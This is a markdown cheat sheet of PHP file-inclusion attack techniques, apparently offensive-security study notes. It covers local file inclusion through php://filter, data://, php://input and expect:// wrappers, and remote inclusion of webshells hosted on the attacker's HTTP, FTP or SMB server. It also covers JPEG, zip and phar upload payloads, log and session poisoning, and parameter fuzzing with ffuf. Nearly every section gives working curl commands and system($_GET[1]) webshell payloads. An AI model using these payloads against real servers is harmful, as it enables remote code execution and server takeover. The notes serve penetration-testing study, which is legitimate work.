### Local File Inclusion
null byte (%00) can be used to bypass extensions being added as it is used to signal the end of a string (in PHP versions < 5.5)


#### data://
php wrappers can be used to retrieve local files if filtering is in place, for example:
``php://filter/read=convert.base64-encode/resource=[filename]``

using the data:// wrapper allows for inclusion of external data, including php code, but it needs the *allow_url_include* setting to be enabled

&nbsp;
 check for "allow_url_include" option in  php configuration file to see if it's enabled 

  common locations:
  
| Apache | NGinx |
|-|-| 
| /etc/php/X.Y/apache2/php.ini | /etc/php/X.Y/fpm/php.ini |

``data://text/plain;base64,[b64-encoded-webshell]``

<br>

#### php://input

the php://input wrapper works in a similar way (also requires allow_url_include setting) but accepts POST data, so we could send a payload such as 


  
``curl -X POST --data '<?php system($_GET[1]) ?>' http://[server]:[port]/index.php?language=php://input&1=id`` 
(passing the webshell code through POST and the command to be executed through GET)


&nbsp;
``curl -X POST --data "<?php system('id') ?>" http://[server]:[port]/index.php?language=php://input``
(passing everything through POST)

<br>

#### expect://
the expect:// wrapper is designed to run commands, but is an external extension so it needs to be installed and enabled on the server, check for "extensions=expect" in php configuration
``curl http://[server]:[port]/index.php?language=expect://id``

--- 
### Remote File Inclusion

#### simple http server
a webshell can be hosted in the attacking machine by using **python3 -m http.server 80** and then a request made to ``http://[your-ip]:80/sh.php&1=id`` will execute the *id* command

&nbsp;
#### simple ftp server

pyftpdlib can also be used to host a simple ftp server, then a request using the ftp:// schema will work (can bypass a filtering to http:// schema that might be in place)

> pip3 install pyftpdlib
> python3 -m pyftpdlib 21

&nbsp;
#### simple smb server
if the server hosting the website is running windows, a SMB RFI can be achieved using Impacket's smbserver.py (it allows anonymous authentication by default), the payload should then reference the UNC path 
`\\\\[your-ip]\\share\\sh.php)`

 > impacket-smbserver -smb2support share $(pwd)

---
### LFI and File Uploads

#### Crafted file upload

in some occasions, RCE can be achieved by crafting a malicious file containing some valid format magic number (i.e.: one that would pass through an image filter, JPEG for example) and a webshell

``echo -n -e '\\xff\\xd8\\xff\\xe0\\x00\\x10\\x4a46\\x49\\x46\\x00\\x01<\?php system($\_GET[1]) ?>' > sh.jpeg``

the inclusion of this file would allow commands passed through a GET parameter to be executed in the server

<br>

#### Zip Upload

(this is a php specific technique) if a simple crafted file upload it is worth trying to upload a zip file and using the zip:// wrapper

``echo '<\?php system($\_GET[1]) ?>' > shell.php && zip shell.jpg shell.php``

the file can then be included by using zip://shell.jpg#shell.php [the '#' is used to reference a file inside the zip archive] and a command passed through GET would be executed

<br>

#### Phar Upload

rce can also be achieved by crafting a malicious phar (php archive) payload and including the file with the phar:// schema

```
nano phar_payload
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET[1]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
^X

php --define phar.readonly=0 phar_payload && mv shell.phar shell.jpg
```

the webshell could then be accessed through ``phar://shell.jpg%2shell.txt&1=id``

---
### Log Poisoning

#### Server Log Poisoning

log poisoning consists in sending malicious code to be executed through user-controlled parameters (e.g.: User-Agent header) which will then be executed whenever a log file is included, the following payload will execute a command passed through GET parameter *&1=id* if a log file is included:

``curl http://[server]:[port]/index.php -A '<\?php system($\_GET[1]); ?>'

log file location varies depending on the technology used, common paths might be:

| Apache | Nginx | 
|-|-|
| /var/log/apache2/ | /var/log/nginx/ | 
| C:\\xampp\\apache\\logs\\ | C:\\nginx\\log\\ |

<br>
#### PHP Session Poisoning

php applications might use a PHPSESSID cookie to hold user-related data in session files in the backend, usually saved on the following paths:

| Linux | Windows |
|-|-|
|/var/lib/php/sessions|C:\\Windows\\Temp\\|

session files are prepended with "sess_" so the cookie "123456789def" would be saved in the *sess_123456789def* file

if the cookie holds information about a parameter from the request it could then be injected with a simple webshell payload such as  ``<?php system($_GET[1]); ?>``  and then the */var/lib/php/sessions/sess_[cookie_name]* could be included while sending the *&1=[command]* and it would be executed

note: the session file would need to be poisoned again to run another command, so this would be best suited to write some form of persistend webshell/trigger a reverse shell

---
### Automated Scanning

#### Fuzzing Parameters

tools like ffuf can be used to fuzz for exposed parameters (parameters used in user forms are usually not vulnerable, but ones that are not linked to any HTML form might not be as secure)

``
ffuf -w  [wordlist] -u http://[server]:[port]/index.php?FUZZ=[payload]``

there are many wordlists which can be used, for example [under seclists]: 

- Discovery/Web-Content/burp-parameter.names.txt 
- Fuzzing/LFI/LFI-Jhaddix.txt

it is also worth fuzzing for configuration files to find potential important paths that might not appear in wordlists (for example custom configuration files) 


